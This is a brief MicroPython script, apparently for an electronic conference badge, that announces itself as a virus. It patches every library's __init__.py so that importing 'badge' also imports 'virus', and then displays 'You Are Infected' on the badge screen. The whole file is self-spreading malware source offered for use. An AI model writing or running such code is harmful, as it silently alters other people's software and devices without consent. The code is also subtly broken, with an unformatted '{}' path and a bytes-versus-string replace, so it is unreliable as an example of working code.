import os

print('Starting virus...')

for lib in os.ilistdir('lib'):
    print('patching', lib, '...')
    with open('lib/{}/__init__.py', 'rb') as src_file:
        src = src_file.read()
    src2 = src.replace('import badge\n', 'import badge; import virus\n')
    with open('lib/{}/__init__.py', 'wb') as dst_file:
        dst_file.write(src2)

print('Finished patching')

import ugfx
ugfx.init()

ugfx.set_lut(ugfx.LUT_FULL)
ugfx.clear(ugfx.BLACK)
ugfx.string(30,25,"You Are Infected","Roboto_BlackItalic24",ugfx.WHITE)
ugfx.flush()

import time
time.sleep(0.5)
